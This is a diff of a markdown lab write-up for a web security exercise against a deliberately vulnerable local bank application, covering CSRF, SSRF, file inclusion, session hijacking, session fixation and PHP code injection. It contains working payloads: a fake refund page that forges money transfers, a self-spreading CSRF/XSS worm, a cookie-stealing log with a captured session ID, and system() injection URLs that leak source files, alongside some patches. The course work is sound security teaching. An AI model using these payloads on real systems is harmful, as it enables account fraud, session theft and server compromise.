@@ -1,6 +1,49 @@
+## Web Application Vulnerabilities -2
+
+
+**Table of Contents**
+
+  * [Exercise 1: Cross Site Request Forgery (CSRF/XSRF)](#exercise-1--cross-site-request-forgery--csrf-xsrf-)
+    + [Task 1](#task-1)
+    + [Task 2](#task-2)
+    + [Task 3](#task-3)
+    + [Task 4](#task-4)
+    + [Task 5.](#task-5)
+  * [Exercise 2: Server-Side Request Forgery(SSRF)](#exercise-2--server-side-request-forgery-ssrf-)
+    + [Task 1](#task-1-1)
+    + [Task 2](#task-2-1)
+  * [Exercise 3: Local File Inclusion (LFI)](#exercise-3--local-file-inclusion--lfi-)
+    + [Task 3.1](#task-31)
+    + [Task 3.2](#task-32)
+    + [Task 3.3](#task-33)
+  * [Exercise 4: Session Hijacking](#exercise-4--session-hijacking)
+    + [Task 4.1](#task-41)
+    + [Task 4.2](#task-42)
+    + [Task 4.3](#task-43)
+    + [Task 4.4](#task-44)
+    + [Task 4.5](#task-45)
+  * [Exercise 5: Session Fixation](#exercise-5--session-fixation)
+    + [Task 5.1](#task-51)
+    + [Task 5.2](#task-52)
+    + [Task 5.3](#task-53)
+    + [Task 5.4](#task-54)
+  * [Exercise 6: Remote Code Injection](#exercise-6--remote-code-injection)
+    + [Task 6.1](#task-61)
+    + [Task 6.2](#task-62)
+    + [Task 6.3](#task-63)
+    + [Task 6.4](#task-64)
+    + [Task 6.5](#task-65)
+    + [Task 6.6](#task-66)
+
+
+
+
+
+## Web Application Vulnerabilities -2
+
 ### Exercise 1: Cross Site Request Forgery (CSRF/XSRF)
 
-
+#### Task 1
 __Q 1. Briefly explain what CSRF/XSRF is in your own words (outline the roles and steps involved in XSRF attack).__
 
 __Solution__
@@ -17,11 +60,12 @@ __Solution__
     - Request is sent on behalf of malicious users so the request is executed successfully.
 
 
-
+#### Task 2
 
 __Q: What is the difference between XSS and CSRF/XSRF from their execution perspective?__  
 __Solution:__ Both of these are client-side attacks. But, Cross-site scripting (or XSS) allows an attacker to execute arbitrary JavaScript within the browser of a victim user. Where as Cross-site request forgery (or CSRF) allows an attacker to trick a victim user to perform actions that they do not intend to.
 
+#### Task 3
 
 __Q: Briefly explain why your bank is theoretically vulnerable to CSRF/XSRF attack!__  
 __Solution:__ After examining the web request from the `Transfer Funds` page, the web application doesn't send a unique identifier or token, that identifies the request being originated from the same domain or performed by an actual user.
@@ -29,7 +73,7 @@ __Solution:__ After examining the web request from the `Transfer Funds` page, th
 ![funds_transfer](images/task2/funds_transfer.PNG)
 
 
-
+#### Task 4
 
 __Assume that you are a valid customer of your bank. Show how you can use XSRF to transfer money from another account to your account.__
 __Solution:__ 
@@ -51,20 +95,14 @@ __Solution:__
 
             function getURL() {
 
-            const url = "http://localhost/htdocs/index.php?page=htbtransfer&srcacc=" + 
-            accountNo+ "&dstbank=41131337&dstacc=14314312&amount=
-            1.95&remark=&htbtransfer=Transfer";
-            http://localhost/htdocs/index.php?page
-            =htbtransfer&srcacc=173105291&dstbank
-            =41131337&dstacc=11111111&amount=1&
-            remark=&htbtransfer=Transfer 
-            window.open(url, "_blank");
+                const url = "http://localhost/htdocs/index.php?page=htbtransfer&srcacc=" + accountNo + "&dstbank=41131337&dstacc=14314312&amount=1.95&remark=&htbtransfer=Transfer";
+                http://localhost/htdocs/index.php?page=htbtransfer&srcacc=173105291&dstbank=41131337&dstacc=11111111&amount=1&remark=&htbtransfer=Transfer 
+                window.open(url, "_blank");
             }
         </script>
         <html>
         <body>
-            We are very sorry for the inconvenience, you had an 
-            error while during the last transaction, please click 
+            We are very sorry for the inconvenience, you had an error while during the last transaction, please click the
             button bellow to claim your refund plus 1 cent gift.
             <button onclick="getURL()"> Proceed </button>
 
@@ -107,7 +145,7 @@ __Solution:__
 ![Attack_Successful](images/task2/1.4.2.JPG)
 
 
-
+#### Task 5.
 __Q: Enhance your last attack such that it automatically spreads to other accounts and transfers your money from them too. Briefly explain your attack.__
 
 __solution__
@@ -127,7 +165,8 @@ __solution__
 <html>
 
 <body>
-    We are very sorry for the inconvenience, you had an error..
+    We are very sorry for the inconvenience, you had an error while during the last transaction, please click the button
+    bellow to claim your refund plus 1 cent gift.
     <button onclick="getURL()"> Proceed </button>
     <div style="display:none" id="images"> </div>
 </body>
@@ -138,57 +177,37 @@ __solution__
     const urlParams = new URLSearchParams(queryString);
     const accountNo = urlParams.get('x');
     console.log(accountNo);
-    const allAccounts = 
-    [11111111, 22222222, 33333333, 44444444, 55555555,
-     66666666, 77777777, 88888888, 99999999];
+
+    const allAccounts = [11111111, 22222222, 33333333, 44444444, 55555555, 66666666, 77777777, 88888888, 99999999];
+
     function getURL() {
+
         allAccounts.forEach(function (destAccount) {
             if (destAccount != accountNo) {
                 var varName = new Image();
-                varName.src = "http://localhost/htdocs/
-                index.php?page=htbtransfer&srcacc=" + 
-                accountNo + "&dstbank=41131337&dstacc="
-                 + destAccount +
-                  "&amount=1.1&remark=%3Cscript%3Evar+x
-                  +%3D+document.getElementsByName%28
-                  %22account%22%29%5B0%5D.value%3C%2Fscript%3E&htbtransfer=Transfer";
-                document.getElementById('images')
-                .appendChild(varName);
+                varName.src = "http://localhost/htdocs/index.php?page=htbtransfer&srcacc=" + accountNo + "&dstbank=41131337&dstacc=" + destAccount + "&amount=1.1&remark=%3Cscript%3Evar+x+%3D+document.getElementsByName%28%22account%22%29%5B0%5D.value%3C%2Fscript%3E&htbtransfer=Transfer";
+                document.getElementById('images').appendChild(varName);
 
                 var funcName = new Image();
-                funcName.src = "http://localhost/htdocs/index.php?page
-                =htbtransfer&srcacc=" + accountNo + "&dstbank
-                =41131337&dstacc=" + destAccount + "&amount
-                =1.2&remark=%3Cscript%3Efunction+
-                y%28%29%7Bwindow.open%28%22http%3A%2F%2Flocalhost%2Fhtdocs
-                %2Ferror.html%3Fx%3D%22%2Bx
-                %2C+%22_blank%22%29%3B%7D%3C%2Fscript%3E&htbtransfer=Transfer";
+                funcName.src = "http://localhost/htdocs/index.php?page=htbtransfer&srcacc=" + accountNo + "&dstbank=41131337&dstacc=" + destAccount + "&amount=1.2&remark=%3Cscript%3Efunction+y%28%29%7Bwindow.open%28%22http%3A%2F%2Flocalhost%2Fhtdocs%2Ferror.html%3Fx%3D%22%2Bx%2C+%22_blank%22%29%3B%7D%3C%2Fscript%3E&htbtransfer=Transfer";
                 document.getElementById('images').appendChild(funcName);
 
                 var executeFunction = new Image();
-                executeFunction.src = "http://localhost/htdocs/index.php?page=
-                htbtransfer&srcacc="+ accountNo + "
-                &dstbank=41131337&dstacc="
-                 + destAccount + "&amount=1.3&remark=%3Ca+onclick%3D%22y%28%29
-                 %22%3EError+please+click+
-                 here%21%21%3C%2Fa%3E++&htbtransfer=Transfer";
+                executeFunction.src = "http://localhost/htdocs/index.php?page=htbtransfer&srcacc=" + accountNo + "&dstbank=41131337&dstacc=" + destAccount + "&amount=1.3&remark=%3Ca+onclick%3D%22y%28%29%22%3EError+please+click+here%21%21%3C%2Fa%3E++&htbtransfer=Transfer";
                 document.getElementById('images').appendChild(executeFunction);
 
             }
         });
 
-        const url = "http://localhost/htdocs/index.php
-        ?page=htbtransfer&srcacc=" 
-        + accountNo + "&dstbank=41131337&dstacc=14314312
-        &amount=1.95&remark=&htbtransfer=Transfer";
+        const url = "http://localhost/htdocs/index.php?page=htbtransfer&srcacc=" + accountNo + "&dstbank=41131337&dstacc=14314312&amount=1.95&remark=&htbtransfer=Transfer";
 
         window.open(url, "_blank");
 
     }
 </script>
+
 </html>
 ```
-
 - When the victim clicks the ` Error please click here!!!` link the attack will spread to all accounts on the bank server.
 
 ![Automated_Attack](images/task2/1.5.JPG)
@@ -199,6 +218,7 @@ __solution__
 ### Exercise 2: Server-Side Request Forgery(SSRF)
 
 
+#### Task 1
 
 __1. Briefly explain in your own words what is SSRF vulnerability and common SSRF attacks and what are the common SSRF defences circumventing__
 
@@ -246,7 +266,7 @@ __Solution__
 
 
 
-
+#### Task 2
 
 __2. What is the difference between SSRF and CSRF/XSRF from their execution
 perspective?__
@@ -257,6 +277,7 @@ __Solution:__  CSRF targets the user, to trick or executes malicious links/reque
 ### Exercise 3: Local File Inclusion (LFI)
 
 
+#### Task 3.1
 
 __1. Briefly explain what is a Local File Inclusion (LFI) vulnerability? By using a simple example, describe how do LFIs work and how to avoid this vulnerability? Show a vulnerable code and apply your patch to it.__
 
@@ -311,6 +332,8 @@ How it works:
 
 
 
+#### Task 3.2
+
 
 __2. How do you identify and exploit LFI? Describe it with a simple example.__
 
@@ -336,6 +359,7 @@ __2. How do you identify and exploit LFI? Describe it with a simple example.__
 
 
 
+#### Task 3.3
 
 
 __3. Briefly explain what is Remote File Inclusion (RFI) and how can you minimise the risk of RFI attacks? And LFI vs. RFI?__  
@@ -363,6 +387,7 @@ In the RFI the attacker uses remote files whereas in LFI local files are used to
 
 ### Exercise 4: Session Hijacking
 
+#### Task 4.1
 
 __1. Install a webserver on your machine. Use it to write a script that will read the
 information required to hijack a session. Briefly describe your script.__
@@ -389,26 +414,18 @@ __Solution:__
     ```bash
         └─$ sudo python -m SimpleHTTPServer 81                                                                            
         Serving HTTP on 0.0.0.0 port 81 ...
-        192.168.37.128 - 
-        - [23/May/2021 15:34:01] code 404, message File not found
-        192.168.37.128 - - 
-        [23/May/2021 15:34:01] 
-        "GET /cookie.html?c=USECURITYID=crblk95qe8b8mmdcva0saaj9m4 HTTP/1.1" 404 -
-        192.168.37.128 - 
-        - [23/May/2021 15:35:07] code 404, message File not found
-        192.168.37.128 - 
-        - [23/May/2021 15:35:07] 
-        "GET /cookie.html?c=USECURITYID=crblk95qe8b8mmdcva0saaj9m4 HTTP/1.1" 404 -
-        192.168.37.128 - 
-        - [23/May/2021 15:38:23] code 404, message File not found
-        192.168.37.128 - 
-        - [23/May/2021 15:38:23] 
-        "GET /c=USECURITYID=crblk95qe8b8mmdcva0saaj9m4 HTTP/1.1" 404 -
+        192.168.37.128 - - [23/May/2021 15:34:01] code 404, message File not found
+        192.168.37.128 - - [23/May/2021 15:34:01] "GET /cookie.html?c=USECURITYID=crblk95qe8b8mmdcva0saaj9m4 HTTP/1.1" 404 -
+        192.168.37.128 - - [23/May/2021 15:35:07] code 404, message File not found
+        192.168.37.128 - - [23/May/2021 15:35:07] "GET /cookie.html?c=USECURITYID=crblk95qe8b8mmdcva0saaj9m4 HTTP/1.1" 404 -
+        192.168.37.128 - - [23/May/2021 15:38:23] code 404, message File not found
+        192.168.37.128 - - [23/May/2021 15:38:23] "GET /c=USECURITYID=crblk95qe8b8mmdcva0saaj9m4 HTTP/1.1" 404 -
 
     ```
 - From the logs we can observe the request contents `USECURITYID=crblk95qe8b8mmdcva0saaj9m4` which we know that, is a cookie value.
 
 
+#### Task 4.2
 
 
 __2. Use the implementation from the last step to hijack the session of a customer of your bank. Briefly describe the steps to perform this attack.__
@@ -416,16 +433,10 @@ __2. Use the implementation from the last step to hijack the session of a custom
 __solution:__
 
 - Copy the `USECURITYID=b35oqi84j4l16mecckl4lksf60`(another captured cookie) that is captured on the server log.
-- Installed `EditThisCookie` extension from chrome 
-<!-- https://chrome.google.com/\nwebstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg/related?hl=en) -->
+- Installed `EditThisCookie` extension from chrome https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg/related?hl=en
 - Open the login page of the application in a private window .
-
 - Paste the cookie  value, into the `Value` field.
-
-
 ![edit_this_cookie](images/task2/edit_this_cookie.PNG)
-
-
 - Click on Green tick below the window.
 - Reload the page.
 - Should be logged in as a user.
@@ -436,6 +447,8 @@ __solution:__
 
 
 
+#### Task 4.3
+
 
 __3. Which possible implementation mistakes enable your attack?__
 __Solution :__
@@ -445,10 +458,15 @@ __Solution :__
 
 
 
+#### Task 4.4
+
+
 __4. How would https influence it?__
 __Solution:__ `HTTPS` has no significant influence in this case, as the attacker can still access the cookie (as it is stored un-encrypted) and send it over to the attacker's server. However, this would be beneficial if the attacker is in the same network as the user and try to steal cookies, as the data is sent encrypted. 
  If cookies are sent in headers `secure` flag should be set, indicate to the browser that cookies can only be sent in `HTTPS` requests.
 
+
+#### Task 4.5
 
 
 __5. Implement some precautions which can prevent or mitigate this attack?__
@@ -458,18 +476,7 @@ __Solution:__
 - Vulnerable code:  
 
     ```php
-    $sql="insert into ".$htbconf['db/transfers']
-    ." (".$htbconf['db/transfers.time'].", "
-    .$htbconf['db/transfers.srcbank'].", "
-    .$htbconf['db/transfers.srcacc'].", "
-    .$htbconf['db/transfers.dstbank'].", "
-    .$htbconf['db/transfers.dstacc'].", "
-    .$htbconf['db/transfers.remark'].", "
-    .$htbconf['db/transfers.amount'].") values(now(), "
-    .$htbconf['bank/code'].", ".($http['srcacc'] 
-    ^ $xorValue).", ".$http['dstbank'].", "
-    .$http['dstacc'].", '".$http['remark']
-    ."', ".$http['amount'].")";  
+    $sql="insert into ".$htbconf['db/transfers']." (".$htbconf['db/transfers.time'].", ".$htbconf['db/transfers.srcbank'].", ".$htbconf['db/transfers.srcacc'].", ".$htbconf['db/transfers.dstbank'].", ".$htbconf['db/transfers.dstacc'].", ".$htbconf['db/transfers.remark'].", ".$htbconf['db/transfers.amount'].") values(now(), ".$htbconf['bank/code'].", ".($http['srcacc'] ^ $xorValue).", ".$http['dstbank'].", ".$http['dstacc'].", '".$http['remark']."', ".$http['amount'].")";  
 
     $result = mysql_query($sql);
 
@@ -478,18 +485,7 @@ __Solution:__
 - Fixed code:  
 
     ```php
-    $sql="insert into ".$htbconf['db/transfers']
-    ." (".$htbconf['db/transfers.time'].", "
-    .$htbconf['db/transfers.srcbank'].", "
-    .$htbconf['db/transfers.srcacc'].", "
-    .$htbconf['db/transfers.dstbank'].", "
-    .$htbconf['db/transfers.dstacc'].", "
-    .$htbconf['db/transfers.remark'].", "
-    .$htbconf['db/transfers.amount'].") values(now(), "
-    .$htbconf['bank/code'].", ".($http['srcacc'] 
-    ^ $xorValue).", ".$http['dstbank'].", "
-    .$http['dstacc'].", '".htmlspecialchars($http['remark'])
-    ."', ".$http['amount'].")";  
+    $sql="insert into ".$htbconf['db/transfers']." (".$htbconf['db/transfers.time'].", ".$htbconf['db/transfers.srcbank'].", ".$htbconf['db/transfers.srcacc'].", ".$htbconf['db/transfers.dstbank'].", ".$htbconf['db/transfers.dstacc'].", ".$htbconf['db/transfers.remark'].", ".$htbconf['db/transfers.amount'].") values(now(), ".$htbconf['bank/code'].", ".($http['srcacc'] ^ $xorValue).", ".$http['dstbank'].", ".$http['dstacc'].", '".htmlspecialchars($http['remark'])."', ".$http['amount'].")";  
 
     $result = mysql_query($sql);
     ```
@@ -525,9 +521,13 @@ session_set_cookie_params($htbconf['bank/cookievalidity'],null,null,null,true);
 ### Exercise 5: Session Fixation
 
 
+#### Task 5.1
 
 __1. Explain the difference to Session Hijacking.__  
 __Solution :__ In Session Fixation, the attacker forces the user to use the session of his choice, wherein  Session Hijacking, the logged-in user session is hijacked.
+
+
+#### Task 5.2
 
 
 __2. Sketch an attack that allows you to take over the session of a bank user__
@@ -622,6 +622,10 @@ __Solution :__
 
 
 
+
+#### Task 5.3
+
+
 __3. How can you generally verify that an application is vulnerable to this type of attack?__
 __solution:__
 - Set the cookie value to random string(usually similar length or format as actual cookie value) before logging in to the application.
@@ -629,6 +633,9 @@ __solution:__
 - Observe the cookie value set  after login by the application in developer tools => storage.
 - If the cookie value is same as set before login and no new cookie name, values or parameters are added and the account is still logged in, then we can confirm that application is vulnerable to session fixation attack.
 
+
+
+#### Task 5.4
 
 
 __4. Does https influence your attack?__
@@ -656,7 +663,7 @@ __Solution__ Everytime a session has been started regenerate the session id.
 
 ### Exercise 6: Remote Code Injection
 
-
+#### Task 6.1
 
 __1. Find a section that allows you to inject and execute arbitrary code (PHP). Document your steps and explain why does it allow the execution?__
 __solution :__
@@ -692,12 +699,11 @@ $replaceWith =''.phpinfo().'';
 ```
 
 - **Result**
-  
 ![Code execution - phpinfo](images/task2/phpinfo.PNG)
 
 
 
-
+#### Task 6.2
 
 
 __2. Disclose the master password for the database your bank application has access to. Indicate username, password and DB name as well as the IP address of the machine this database is running on.__
@@ -740,6 +746,8 @@ __solution__
 
 
 
+#### Task 6.3
+
 
 
 __3. Explain how you can display the php settings of your webserver! Which information is relevant for the attacker?__
@@ -767,6 +775,8 @@ __solution__
 
 
 
+#### Task 6.4
+
 
 __4. Assume you are running a server with virtual hosts. Can you disclose the password for another bank database and can you access it? Explain which potential risk does this vulnerability imply for virtual hosts?__
 __Solution__
@@ -780,6 +790,7 @@ If one virtual host is exploitable(code injection) that lead to other subdomain 
 
 
 
+#### Task 6.5
 
 
 __5. Display /etc/passwd of the web server, the bank application is running on. Try
@@ -813,6 +824,8 @@ The above methods are un-successfull as they are executing on server side but no
 
 
 
+#### Task 6.6
+
 
 
 __6. Show how to “leak” the complete source files of your web application. Briefly describe, how you accomplished this.__
@@ -826,10 +839,8 @@ __solution :__
         ```
     - Application URL
         ```javascript
-        http://192.168.37.128/htdocs/index.php?
-        account=173105291&page=
-        htbdetails&query=%27.+system%28%22cat+
-        index.php%22%29+.%27&
+        http://192.168.37.128/htdocs/index.php?account=173105291&page=
+        htbdetails&query=%27.+system%28%22cat+index.php%22%29+.%27&
         submit=Submit+Query
         ```
     -  **Result**
@@ -844,13 +855,10 @@ __solution :__
     ```
     - Application URL 
         ```javascript
-        http://192.168.37.128/htdocs/index.php
-        ?account=173105291page=htbdetails
-        &query=%27.+system%28%22cat+login.php%22%29
-        +.%27&submit=Submit+Query
+        http://192.168.37.128/htdocs/index.php?account=173105291page=htbdetails
+        &query=%27.+system%28%22cat+login.php%22%29+.%27&submit=Submit+Query
         ```
     - **Result**
-
     ![leak_source_2](images/task2/leak_source_2.PNG)
 
 
@@ -874,13 +882,12 @@ __solution :__
 ```
 
 - **Result** (received connection from victim)
-
 ![reverse_shell](images/task2/reverse_shell.PNG)
 
 **b**). look for file permissions of index page (navigate to /var/www/html/htdocs),
 
 ```bash
-    $ ls -la | less
+    $ ls -la
     ls -la
     total 40
     drwSr-sr-x 3 root  root 4096 May 10 07:23 .
@@ -888,6 +895,9 @@ __solution :__
     -rw-rw-rw- 1 mysql root  141 May 10 07:23 file
     -rw-r--r-- 1 root  root 6791 Apr  6  2014 htb.css
     -rw-r--r-- 1 root  root  591 Apr  6  2014 htb.js
+    drwxr-xr-x 3 root  root 4096 Mar 20  2014 images
+    -rw-r--r-- 1 root  root 7080 May 12 11:06 index.php
+    -rw-r--r-- 1 root  root 1997 May 10 05:34 login.php
 
 ```
 
@@ -926,11 +936,26 @@ __solution :__
 - locating other log files
 
     ```bash
-    $ locate log | grep apache | less
+    $ locate log | grep apache
         /etc/apache2/conf-available/other-vhosts-access-log.conf
         /etc/apache2/conf-enabled/other-vhosts-access-log.conf
         /etc/apache2/mods-available/log_debug.load
         /etc/apache2/mods-available/log_forensic.load
+        /etc/logrotate.d/apache2
+        /usr/lib/apache2/modules/mod_log_debug.so
+        /usr/lib/apache2/modules/mod_log_forensic.so
+        /usr/share/apache2/icons/openlogo-75.png
+        /usr/share/doc/apache2/changelog.Debian.gz
+        /usr/share/doc/apache2/changelog.gz
+        /usr/share/doc/apache2-bin/changelog.Debian.gz
+        /usr/share/doc/apache2-bin/changelog.gz
+        /usr/share/doc/apache2-data/changelog.Debian.gz
+        /usr/share/doc/apache2-utils/changelog.Debian.gz
+        /usr/share/doc/apache2-utils/changelog.gz
+        /usr/share/doc/libapache-pom-java/changelog.Debian.gz
+        /var/lib/apache2/conf/enabled_by_maint/other-vhosts-access-log
+        /var/log/apache2
+
     ```
 
 - navigate to /var/log/
@@ -942,14 +967,31 @@ __solution :__
 - look for file permissions
 
     ```bash
-    ls -la | less
+    ls -la
     total 5500
     drwxr-xr-x  19 root     root               4096 May 22 04:44 .
     drwxr-xr-x  12 root     root               4096 Apr 16 16:32 ..
     -rw-r--r--   1 root     root              25060 May 22 08:54 Xorg.0.log
     -rw-r--r--   1 root     root              54260 May 19 04:44 Xorg.0.log.old
     -rw-r--r--   1 root     root              24191 May 15 06:21 Xorg.1.log
+    -rw-r--r--   1 root     root              24195 May 15 05:31 Xorg.1.log.old
+    -rw-r--r--   1 root     root                516 May  4 10:15 alternatives.log
+    -rw-r--r--   1 root     root               1680 Apr 28 06:12 alternatives.log.1
+    -rw-r--r--   1 root     root               6567 Mar  9 10:10 alternatives.log.2.gz
+    drwxr-x---   2 root     adm                4096 May 19 04:04 apache2
+    drwxr-xr-x   2 root     root               4096 May 15 19:06 apt
+    -rw-r-----   1 root     adm               67039 May 22 08:55 auth.log
+    -rw-r-----   1 root     adm              316551 May 16 04:35 auth.log.1
+    -rw-r-----   1 root     adm               11047 May  8 15:39 auth.log.2.gz
+    -rw-r-----   1 root     adm               10748 May  1 18:55 auth.log.3.gz
+    -rw-r-----   1 root     adm                5532 Apr 25 04:22 auth.log.4.gz
+    -rw-------   1 root     root               5501 May 19 04:45 boot.log
+    -rw-------   1 root     root               5501 May 14 02:51 boot.log.1
+    -rw-------   1 root     root               5501 Apr 30 07:39 boot.log.2
+    -rw-------   1 root     root               6759 Apr 25 04:22 boot.log.3
+    -rw-------   1 root     root               5451 Apr 19 00:49 boot.log.4
+    -rw-------   1 root     root              66466 Apr  2 05:52 boot.log.5
     ```
-> All the files found are not writeable by service account `www` which we exploited.
+    > All the files found are not writeable by service account `www` which we exploited.
 
 
